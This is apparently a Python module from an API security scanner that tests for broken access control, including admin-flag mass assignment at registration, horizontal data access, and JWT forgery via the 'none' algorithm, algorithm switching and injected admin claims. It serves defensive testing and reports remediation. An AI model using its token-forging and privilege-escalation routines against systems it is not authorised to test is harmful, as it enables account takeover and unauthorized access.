"""
Broken Access Control Scanner Module.

This module tests for vulnerabilities related to broken access control,
where users can gain unauthorized access to resources or perform actions
that should be restricted based on their role or permissions.
"""

import json
import time
import random
import string
import base64
from typing import Dict, List, Any, Optional, Tuple

from core.base_scanner import BaseScanner
from core.openapi import find_endpoint_by_purpose
from core.account_cache import account_cache


class Scanner(BaseScanner):
    """Scanner for detecting broken access control vulnerabilities."""
    
    def __init__(self, target: Dict[str, Any], config: Dict[str, Any]):
        """
        Initialize the scanner.
        
        Args:
            target: Target configuration
            config: Scanner-specific configuration
        """
        super().__init__(target, config)
        
        # Initialize endpoints with default values
        self.debug_endpoint = config.get("debug_endpoint", "/users/v1/_debug")
        self.register_endpoint = config.get("register_endpoint", "/users/v1/register")
        self.login_endpoint = config.get("login_endpoint", "/users/v1/login")
        self.admin_endpoint = config.get("admin_endpoint", "/admin")
        self.user_endpoint = config.get("user_endpoint", "/users/{username}")
        
        # Extract endpoints from OpenAPI spec if available
        self._extract_endpoints_from_openapi(target)
        
        # Log the resolved endpoints
        self.logger.info(f"Using debug endpoint: {self.debug_endpoint}")
        self.logger.info(f"Using register endpoint: {self.register_endpoint}")
        self.logger.info(f"Using login endpoint: {self.login_endpoint}")
        self.logger.info(f"Using admin endpoint: {self.admin_endpoint}")
        self.logger.info(f"Using user endpoint: {self.user_endpoint}")
        
        # Field names in requests/responses
        self.username_field = config.get("username_field", "username")
        self.password_field = config.get("password_field", "password")
        self.email_field = config.get("email_field", "email")
        self.admin_field = config.get("admin_field", "admin")
        self.auth_token_field = config.get("auth_token_field", "auth_token")
        self.additional_fields = config.get("additional_fields", {})
        
        # Success indicators
        self.success_status_codes = config.get("success_status_codes", [200, 201, 204])
        
        # Test user credentials
        timestamp = int(time.time())
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        username = f"test_user_{timestamp}_{random_suffix}"
        # For Snorefox API, the username is actually the email
        self.test_email = config.get("test_email", f"{username}@example.com")
        self.test_username = self.test_email  # Set username to be the same as email for Snorefox API
        self.test_password = config.get("test_password", f"Test@{timestamp}")
        
        # Admin user credentials
        admin_name = f"admin_user_{timestamp}_{random_suffix}"
        self.admin_email = config.get("admin_email", f"{admin_name}@example.com")
        self.admin_username = self.admin_email  # Set username to be the same as email for Snorefox API
        self.admin_password = config.get("admin_password", f"Admin@{timestamp}")
        
        # Test delay
        self.test_delay = config.get("test_delay", 1.0)
        
        # Protected resources to test
        self.protected_resources = config.get("protected_resources", [
            {"endpoint": "/admin/users", "method": "GET"},
            {"endpoint": "/admin/settings", "method": "GET"},
            {"endpoint": "/users", "method": "GET"}
        ])
    
    def _extract_endpoints_from_openapi(self, target: Dict[str, Any]) -> None:
        """
        Extract API endpoints from OpenAPI specification.
        
        Args:
            target: Target configuration containing OpenAPI data
        """
        # Check if OpenAPI data is available in the target configuration
        if "openapi" not in target or not isinstance(target["openapi"], dict):
            self.logger.info("No OpenAPI specification data found in target configuration")
            return
        
        openapi_data = target["openapi"]
        
        # Extract endpoints from the OpenAPI specification
        if "endpoints" not in openapi_data or not isinstance(openapi_data["endpoints"], list):
            self.logger.info("No endpoints found in OpenAPI specification data")
            return
        
        endpoints = openapi_data["endpoints"]
        self.logger.info(f"Found {len(endpoints)} endpoints in OpenAPI specification")
        
        # Use the utility function to find endpoints by purpose
        self.register_endpoint = find_endpoint_by_purpose(endpoints, "register", self.register_endpoint)
        self.debug_endpoint = find_endpoint_by_purpose(endpoints, "debug", self.debug_endpoint)
        self.login_endpoint = find_endpoint_by_purpose(endpoints, "login", self.login_endpoint)
        
        # Look for admin endpoints
        for endpoint in endpoints:
            path = endpoint.get("path", "").lower()
            method = endpoint.get("method", "").upper()
            operation_id = endpoint.get("operation_id", "").lower()
            
            # Find admin endpoints
            if "admin" in path or "admin" in operation_id:
                self.admin_endpoint = endpoint.get("path")
                self.logger.info(f"Found admin endpoint: {self.admin_endpoint}")
                break
    
    def run(self) -> List[Dict[str, Any]]:
        """
        Run the scanner.
        
        Returns:
            List of findings
        """
        self.logger.info("Starting broken access control scanner")
        
        # Get existing users
        existing_users = self._get_existing_accounts()
        
        # Test for privilege escalation during registration
        self._test_privilege_escalation_during_registration()
        
        # Test for unauthorized access to admin resources
        self._test_unauthorized_access_to_admin_resources()
        
        # Test for horizontal privilege escalation (accessing other users' data)
        self._test_horizontal_privilege_escalation(existing_users)
        
        # Test for JWT manipulation and forged token vulnerability
        self._test_jwt_manipulation_vulnerability()
        
        # Return findings
        return self.findings
    
    def _get_existing_accounts(self) -> List[Dict[str, Any]]:
        """
        Get the list of existing accounts from the debug endpoint.
        
        Returns:
            List of user accounts
        """
        self.logger.info(f"Retrieving existing accounts from {self.debug_endpoint}")
        
        try:
            response = self._make_request(
                method="GET",
                endpoint=self.debug_endpoint
            )
            
            if response.status_code in self.success_status_codes:
                try:
                    data = response.json()
                    # Handle different response formats
                    if isinstance(data, dict) and "users" in data:
                        accounts = data["users"]
                        self.logger.info(f"Found {len(accounts)} existing accounts")
                        return accounts
                    elif isinstance(data, list):
                        self.logger.info(f"Found {len(data)} existing accounts")
                        return data
                    else:
                        self.logger.warn(f"Unexpected format in debug endpoint response: {data}")
                        return []
                except (ValueError, KeyError) as e:
                    self.logger.error(f"Error parsing debug endpoint response: {str(e)}")
                    return []
            else:
                self.logger.warn(f"Failed to retrieve existing accounts, status code: {response.status_code}")
                return []
        except Exception as e:
            self.logger.error(f"Error accessing debug endpoint: {str(e)}")
            return []
    
    def _register_user(self, username: str, email: str, password: str, admin: bool = False) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """
        Register a new user. Tries to use the account cache when possible.
        
        Args:
            username: Username for the new user
            email: Email for the new user
            password: Password for the new user
            admin: Whether to attempt to register as an admin
            
        Returns:
            Tuple of (success, response_data)
        """
        # If not trying to register as admin, check if we have a cached account we can use
        if not admin:
            cached_account = account_cache.get_account(self.register_endpoint)
            if cached_account:
                self.logger.info(f"Using cached account: {cached_account.get('username')}")
                return True, {
                    self.username_field: cached_account.get('username'),
                    self.email_field: cached_account.get('email'),
                    self.password_field: cached_account.get('password')
                }
        
        self.logger.info(f"Registering user '{username}' with admin={admin}")
        
        payload = {
            self.username_field: username,
            self.email_field: email,
            self.password_field: password
        }
        
        if admin:
            payload[self.admin_field] = True
        
        try:
            response = self._make_request(
                method="POST",
                endpoint=self.register_endpoint,
                json_data=payload
            )
            
            if response.status_code in self.success_status_codes:
                self.logger.info(f"Successfully registered user '{username}'")
                
                # Add to account cache if not an admin account
                if not admin:
                    account_data = {
                        "username": username,
                        "email": email,
                        "password": password,
                        "endpoint": self.register_endpoint,
                        "created_by": "broken_access_control_scanner",
                        "response_code": response.status_code
                    }
                    account_cache.add_account(account_data)
                
                try:
                    return True, response.json()
                except ValueError:
                    return True, None
            else:
                self.logger.warn(f"Failed to register user '{username}', status code: {response.status_code}")
                return False, None
        except Exception as e:
            self.logger.error(f"Error registering user '{username}': {str(e)}")
            return False, None
    
    def _login_user(self, username: str, password: str) -> Tuple[bool, Optional[str]]:
        """
        Login as a user and get auth token.
        
        Args:
            username: Username to login with
            password: Password to login with
            
        Returns:
            Tuple of (success, auth_token)
        """
        self.logger.info(f"Logging in as user '{username}'")
        
        payload = {
            self.username_field: username,
            self.password_field: password
        }
        
        try:
            response = self._make_request(
                method="POST",
                endpoint=self.login_endpoint,
                json_data=payload
            )
            
            if response.status_code in self.success_status_codes:
                try:
                    data = response.json()
                    auth_token = data.get(self.auth_token_field)
                    
                    if auth_token:
                        self.logger.info(f"Successfully logged in as '{username}' and obtained auth token")
                        return True, auth_token
                    else:
                        self.logger.warn(f"Login successful but no auth token found in response")
                        return True, None
                except ValueError:
                    self.logger.warn(f"Login successful but response is not valid JSON")
                    return True, None
            else:
                self.logger.warn(f"Failed to login as '{username}', status code: {response.status_code}")
                return False, None
        except Exception as e:
            self.logger.error(f"Error logging in as '{username}': {str(e)}")
            return False, None
    
    def _test_privilege_escalation_during_registration(self) -> None:
        """Test for privilege escalation during user registration."""
        self.logger.info("Testing for privilege escalation during registration")
        
        # Register a user with admin privileges
        success, _ = self._register_user(
            username=self.admin_username,
            email=self.admin_email,
            password=self.admin_password,
            admin=True
        )
        
        if not success:
            self.logger.info("Failed to register user with admin privileges, skipping test")
            return
        
        # Wait for registration to be processed
        time.sleep(self.test_delay)
        
        # Get the list of users to check if the user was created with admin privileges
        users = self._get_existing_accounts()
        
        admin_user = None
        for user in users:
            if user.get(self.username_field) == self.admin_username:
                admin_user = user
                break
        
        if admin_user and admin_user.get(self.admin_field, False):
            self.logger.warn(f"User '{self.admin_username}' was created with admin privileges")
            
            # Add finding
            self.add_finding(
                vulnerability="Privilege Escalation During Registration",
                details=f"Users can register accounts with administrative privileges by including the '{self.admin_field}' field in the registration request.",
                severity="HIGH",
                endpoint=self.register_endpoint,
                evidence={
                    "registration_payload": {
                        self.username_field: self.admin_username,
                        self.email_field: self.admin_email,
                        self.password_field: "REDACTED",
                        self.admin_field: True
                    },
                    "created_user": admin_user
                },
                remediation="Implement server-side validation to ignore or reject privilege-related fields in registration requests. Never trust client-provided values for privilege levels."
            )
        else:
            self.logger.info(f"User '{self.admin_username}' was not created with admin privileges (expected behavior)")
    
    def _test_unauthorized_access_to_admin_resources(self) -> None:
        """Test for unauthorized access to admin resources."""
        self.logger.info("Testing for unauthorized access to admin resources")
        
        # Register a regular user
        success, _ = self._register_user(
            username=self.test_username,
            email=self.test_email,
            password=self.test_password,
            admin=False
        )
        
        if not success:
            self.logger.info("Failed to register regular user, skipping test")
            return
        
        # Wait for registration to be processed
        time.sleep(self.test_delay)
        
        # Login as the regular user
        success, auth_token = self._login_user(
            username=self.test_username,
            password=self.test_password
        )
        
        if not success or not auth_token:
            self.logger.info("Failed to login as regular user, skipping test")
            return
        
        # Test access to admin resources
        for resource in self.protected_resources:
            endpoint = resource["endpoint"]
            method = resource["method"]
            
            self.logger.info(f"Testing access to {method} {endpoint} with regular user token")
            
            try:
                response = self._make_request(
                    method=method,
                    endpoint=endpoint,
                    headers={"Authorization": f"Bearer {auth_token}"}
                )
                
                if response.status_code in self.success_status_codes:
                    self.logger.warn(f"Regular user can access admin resource: {method} {endpoint}")
                    
                    # Add finding
                    self.add_finding(
                        vulnerability="Unauthorized Access to Admin Resources",
                        details=f"Regular users can access administrative resources that should be restricted: {method} {endpoint}",
                        severity="HIGH",
                        endpoint=endpoint,
                        evidence={
                            "user": self.test_username,
                            "resource": f"{method} {endpoint}",
                            "status_code": response.status_code,
                            "response": self._truncate_response(response)
                        },
                        remediation="Implement proper access control checks for all administrative endpoints. Verify user roles and permissions before allowing access to sensitive operations."
                    )
                else:
                    self.logger.info(f"Regular user cannot access admin resource: {method} {endpoint} (expected behavior)")
            except Exception as e:
                self.logger.error(f"Error testing access to {method} {endpoint}: {str(e)}")
    
    def _test_horizontal_privilege_escalation(self, existing_users: List[Dict[str, Any]]) -> None:
        """
        Test for horizontal privilege escalation (accessing other users' data).
        
        Args:
            existing_users: List of existing user accounts
        """
        self.logger.info("Testing for horizontal privilege escalation")
        
        # Skip if no existing users
        if not existing_users:
            self.logger.info("No existing users found, skipping test")
            return
        
        # Register a regular user if not already done
        success, _ = self._register_user(
            username=self.test_username,
            email=self.test_email,
            password=self.test_password,
            admin=False
        )
        
        if not success:
            # Check if user might already exist
            user_exists = False
            for user in existing_users:
                if user.get(self.username_field) == self.test_username:
                    user_exists = True
                    break
            
            if not user_exists:
                self.logger.info("Failed to register regular user, skipping test")
                return
        
        # Wait for registration to be processed
        time.sleep(self.test_delay)
        
        # Login as the regular user
        success, auth_token = self._login_user(
            username=self.test_username,
            password=self.test_password
        )
        
        if not success or not auth_token:
            self.logger.info("Failed to login as regular user, skipping test")
            return
        
        # Test access to other users' data
        target_users = [user for user in existing_users if user.get(self.username_field) != self.test_username]
        
        if not target_users:
            self.logger.info("No other users to test against, skipping test")
            return
        
        for target_user in target_users[:3]:  # Limit to first 3 users to avoid excessive testing
            target_username = target_user.get(self.username_field)
            
            if not target_username:
                continue
            
            # Test access to user-specific endpoint
            user_endpoint = self.user_endpoint.replace("{username}", target_username)
            
            self.logger.info(f"Testing access to other user's data: {user_endpoint}")
            
            try:
                response = self._make_request(
                    method="GET",
                    endpoint=user_endpoint,
                    headers={"Authorization": f"Bearer {auth_token}"}
                )
                
                if response.status_code in self.success_status_codes:
                    self.logger.warn(f"User can access another user's data: {user_endpoint}")
                    
                    # Add finding
                    self.add_finding(
                        vulnerability="Horizontal Privilege Escalation",
                        details=f"Users can access data belonging to other users: {user_endpoint}",
                        severity="HIGH",
                        endpoint=user_endpoint,
                        evidence={
                            "user": self.test_username,
                            "target_user": target_username,
                            "endpoint": user_endpoint,
                            "status_code": response.status_code,
                            "response": self._truncate_response(response)
                        },
                        remediation="Implement proper access control checks to ensure users can only access their own data. Validate user identity and ownership before allowing access to user-specific resources."
                    )
                else:
                    self.logger.info(f"User cannot access another user's data: {user_endpoint} (expected behavior)")
            except Exception as e:
                self.logger.error(f"Error testing access to {user_endpoint}: {str(e)}")
    
    def _truncate_response(self, response) -> Any:
        """
        Truncate response data to a reasonable size for reporting.
        
        Args:
            response: Response object
            
        Returns:
            Truncated response data
        """
        try:
            data = response.json()
            return data
        except ValueError:
            # If not JSON, truncate text
            text = response.text
            if len(text) > 500:
                return text[:500] + "... [truncated]"
            return text
            
    def _test_jwt_manipulation_vulnerability(self) -> None:
        """
        Test for JWT manipulation and forged token vulnerabilities.
        
        This test checks if the API incorrectly trusts forged JWTs to bypass access restrictions.
        It tests multiple JWT manipulation techniques:
        1. 'none' algorithm attack - removing signature and changing algorithm to 'none'
        2. Algorithm switching attack - changing RS256 to HS256
        3. Token modification - modifying payload claims (e.g., adding admin privileges)
        """
        self.logger.info("Testing for JWT manipulation and forged token vulnerabilities")
        
        # Register a regular user if not already done
        success, _ = self._register_user(
            username=self.test_username,
            email=self.test_email,
            password=self.test_password,
            admin=False
        )
        
        if not success:
            self.logger.info("Failed to register test user, skipping JWT manipulation test")
            return
        
        # Login to get a valid JWT token
        success, auth_token = self._login_user(
            username=self.test_username,
            password=self.test_password
        )
        
        if not success or not auth_token:
            self.logger.info("Failed to login as test user, skipping JWT manipulation test")
            return
            
        # Check if the token is a JWT
        if not self._is_jwt_token(auth_token):
            self.logger.info("Auth token is not a JWT, skipping JWT manipulation test")
            return
            
        self.logger.info(f"Successfully obtained JWT token: {auth_token[:20]}...")
        
        # First, try to access an admin resource with the regular token (should fail)
        admin_endpoints = [
            self.admin_endpoint,
            f"{self.admin_endpoint}/users",
            f"{self.admin_endpoint}/settings"
        ]
        
        # Store the original token response for comparison
        original_responses = {}
        for endpoint in admin_endpoints:
            response = self._make_authenticated_request(
                method="GET",
                endpoint=endpoint,
                auth_token=auth_token
            )
            original_responses[endpoint] = {
                "status_code": response.status_code,
                "body_length": len(response.text)
            }
            self.logger.info(f"Original token access to {endpoint}: {response.status_code}")
        
        # Test 1: 'none' algorithm attack
        none_algorithm_token = self._create_none_algorithm_token(auth_token)
        self._test_forged_token(none_algorithm_token, "'none' algorithm", admin_endpoints, original_responses)
        
        # Test 2: Algorithm switching attack (RS256 to HS256)
        alg_switch_token = self._create_algorithm_switch_token(auth_token)
        self._test_forged_token(alg_switch_token, "algorithm switching (RS256 to HS256)", admin_endpoints, original_responses)
        
        # Test 3: Modified payload claims (adding admin role)
        admin_token = self._create_admin_role_token(auth_token)
        self._test_forged_token(admin_token, "modified payload (added admin role)", admin_endpoints, original_responses)
    
    def _is_jwt_token(self, token: str) -> bool:
        """
        Check if a token is a valid JWT.
        
        Args:
            token: The token to check
            
        Returns:
            True if the token is a JWT, False otherwise
        """
        if not token:
            return False
            
        # JWT tokens have three parts separated by dots: header.payload.signature
        parts = token.split('.')
        if len(parts) != 3:
            return False
            
        # Try to decode the header and payload
        try:
            header_str = self._decode_jwt_part(parts[0])
            header = json.loads(header_str)
            
            # Check if it has typical JWT header fields
            if not ("alg" in header and "typ" in header):
                return False
                
            # Try to decode the payload
            payload_str = self._decode_jwt_part(parts[1])
            payload = json.loads(payload_str)
            
            # Check if it has typical JWT payload fields
            jwt_fields = ["sub", "iat", "exp", "iss", "aud", "nbf", "jti"]
            found_fields = 0
            for field in jwt_fields:
                if field in payload:
                    found_fields += 1
                    
            # If it has at least 1 typical JWT field, consider it a JWT
            return found_fields >= 1
        except Exception as e:
            self.logger.debug(f"Error checking JWT token: {str(e)}")
            return False
    
    def _decode_jwt_part(self, encoded_part: str) -> str:
        """
        Decode a base64url-encoded part of a JWT.
        
        Args:
            encoded_part: The encoded part to decode
            
        Returns:
            The decoded string
        """
        # Convert from base64url to base64
        encoded_part = encoded_part.replace('-', '+').replace('_', '/')
        
        # Add padding if needed
        padding_needed = len(encoded_part) % 4
        if padding_needed:
            encoded_part += '=' * (4 - padding_needed)
            
        # Decode
        return base64.b64decode(encoded_part).decode('utf-8')
    
    def _encode_jwt_part(self, data: Dict[str, Any]) -> str:
        """
        Encode a dictionary as a base64url-encoded JWT part.
        
        Args:
            data: The data to encode
            
        Returns:
            The encoded string
        """
        # Convert to JSON
        json_str = json.dumps(data, separators=(',', ':'))
        
        # Encode to base64
        encoded = base64.b64encode(json_str.encode('utf-8')).decode('utf-8')
        
        # Convert to base64url
        return encoded.replace('+', '-').replace('/', '_').rstrip('=')
    
    def _create_none_algorithm_token(self, token: str) -> str:
        """
        Create a forged token using the 'none' algorithm attack.
        
        Args:
            token: The original token
            
        Returns:
            The forged token
        """
        try:
            # Parse the original token
            parts = token.split('.')
            header_str = self._decode_jwt_part(parts[0])
            header = json.loads(header_str)
            payload_str = self._decode_jwt_part(parts[1])
            payload = json.loads(payload_str)
            
            self.logger.debug(f"Original token header: {json.dumps(header)}")
            self.logger.debug(f"Original token payload: {json.dumps(payload)}")
            
            # Create a new token with 'none' algorithm
            modified_header = header.copy()
            modified_header['alg'] = 'none'
            new_header = self._encode_jwt_part(modified_header)
            new_payload = self._encode_jwt_part(payload)
            
            # Create the modified token without a signature
            modified_token = f"{new_header}.{new_payload}."
            
            self.logger.info(f"Created 'none' algorithm token: {modified_token[:30]}...")
            return modified_token
        except Exception as e:
            self.logger.error(f"Error creating 'none' algorithm token: {str(e)}")
            return token
    
    def _create_algorithm_switch_token(self, token: str) -> str:
        """
        Create a forged token using the algorithm switching attack (RS256 to HS256).
        
        Args:
            token: The original token
            
        Returns:
            The forged token
        """
        try:
            # Parse the original token
            parts = token.split('.')
            header_str = self._decode_jwt_part(parts[0])
            header = json.loads(header_str)
            payload_str = self._decode_jwt_part(parts[1])
            payload = json.loads(payload_str)
            
            # Create a new token with switched algorithm
            modified_header = header.copy()
            if modified_header.get('alg') == 'RS256':
                modified_header['alg'] = 'HS256'
            elif modified_header.get('alg') == 'ES256':
                modified_header['alg'] = 'HS256'
            else:
                modified_header['alg'] = 'HS256'  # Default to HS256
                
            new_header = self._encode_jwt_part(modified_header)
            new_payload = self._encode_jwt_part(payload)
            
            # For simplicity, we're using an empty signature
            # In a real attack, the attacker would sign with the public key as the secret
            modified_token = f"{new_header}.{new_payload}.{parts[2]}"
            
            self.logger.info(f"Created algorithm switch token: {modified_token[:30]}...")
            return modified_token
        except Exception as e:
            self.logger.error(f"Error creating algorithm switch token: {str(e)}")
            return token
    
    def _create_admin_role_token(self, token: str) -> str:
        """
        Create a forged token by modifying the payload to add admin privileges.
        
        Args:
            token: The original token
            
        Returns:
            The forged token
        """
        try:
            # Parse the original token
            parts = token.split('.')
            header_str = self._decode_jwt_part(parts[0])
            header = json.loads(header_str)
            payload_str = self._decode_jwt_part(parts[1])
            payload = json.loads(payload_str)
            
            # Modify the payload to add admin privileges
            modified_payload = payload.copy()
            
            # Try common role/privilege field names
            for field_name in ['role', 'roles', 'permissions', 'groups', 'authorities', 'scopes', 'claims']:
                if field_name in modified_payload:
                    if isinstance(modified_payload[field_name], str):
                        modified_payload[field_name] = 'admin'
                    elif isinstance(modified_payload[field_name], list):
                        if 'admin' not in modified_payload[field_name]:
                            modified_payload[field_name].append('admin')
            
            # If no role field found, add common ones
            if 'role' not in modified_payload:
                modified_payload['role'] = 'admin'
            if 'isAdmin' not in modified_payload:
                modified_payload['isAdmin'] = True
            if 'admin' not in modified_payload:
                modified_payload['admin'] = True
                
            new_header = self._encode_jwt_part(header)
            new_payload = self._encode_jwt_part(modified_payload)
            
            # For simplicity, we're using the original signature
            # In a real attack, this would likely be invalid, but we're testing if the API verifies signatures
            modified_token = f"{new_header}.{new_payload}.{parts[2]}"
            
            self.logger.info(f"Created admin role token: {modified_token[:30]}...")
            return modified_token
        except Exception as e:
            self.logger.error(f"Error creating admin role token: {str(e)}")
            return token
    
    def _make_authenticated_request(self, method: str, endpoint: str, auth_token: str) -> Any:
        """
        Make an authenticated request to the API.
        
        Args:
            method: HTTP method
            endpoint: API endpoint
            auth_token: Authentication token
            
        Returns:
            Response object
        """
        headers = {"Authorization": f"Bearer {auth_token}"}
        return self._make_request(method=method, endpoint=endpoint, headers=headers)
    
    def _test_forged_token(self, forged_token: str, attack_type: str, endpoints: List[str], 
                          original_responses: Dict[str, Dict[str, Any]]) -> None:
        """
        Test if a forged token can be used to access protected resources.
        
        Args:
            forged_token: The forged token to test
            attack_type: The type of attack being tested
            endpoints: List of endpoints to test
            original_responses: Original responses for comparison
        """
        for endpoint in endpoints:
            self.logger.info(f"Testing {attack_type} token against {endpoint}")
            
            response = self._make_authenticated_request(
                method="GET",
                endpoint=endpoint,
                auth_token=forged_token
            )
            
            original = original_responses.get(endpoint, {})
            original_status = original.get("status_code", 0)
            original_length = original.get("body_length", 0)
            
            # Check if the forged token gives a different response than the original token
            # and if it's a successful response (indicating the attack worked)
            if response.status_code in self.success_status_codes and original_status not in self.success_status_codes:
                self.logger.warning(f"JWT {attack_type} attack successful against {endpoint}!")
                
                self.add_finding(
                    vulnerability=f"JWT {attack_type.capitalize()} Vulnerability",
                    details=f"The application accepts forged JWT tokens using {attack_type} attack, allowing unauthorized access to protected resources.",
                    severity="CRITICAL",
                    endpoint=endpoint,
                    evidence={
                        "method": "GET",
                        "attack_type": attack_type,
                        "forged_token": forged_token[:50] + "...",  # Truncate for readability
                        "status_code": response.status_code,
                        "response": self._truncate_response(response)
                    },
                    remediation="Implement proper JWT validation including signature verification, algorithm validation, and claims checking. Never accept 'none' algorithm tokens and ensure proper key management for asymmetric algorithms."
                )
            elif (response.status_code in self.success_status_codes and 
                  original_status in self.success_status_codes and 
                  abs(len(response.text) - original_length) > 50):  # Different content length might indicate different access level
                self.logger.warning(f"JWT {attack_type} attack may be partially successful against {endpoint}")
                
                self.add_finding(
                    vulnerability=f"Potential JWT {attack_type.capitalize()} Vulnerability",
                    details=f"The application may be vulnerable to JWT {attack_type} attacks. The response with a forged token differs significantly from the original token response.",
                    severity="HIGH",
                    endpoint=endpoint,
                    evidence={
                        "method": "GET",
                        "attack_type": attack_type,
                        "forged_token": forged_token[:50] + "...",  # Truncate for readability
                        "status_code": response.status_code,
                        "original_response_length": original_length,
                        "forged_response_length": len(response.text),
                        "response": self._truncate_response(response)
                    },
                    remediation="Implement proper JWT validation including signature verification, algorithm validation, and claims checking. Never accept 'none' algorithm tokens and ensure proper key management for asymmetric algorithms."
                )
            else:
                self.logger.info(f"JWT {attack_type} attack failed against {endpoint} (this is the expected behavior)")
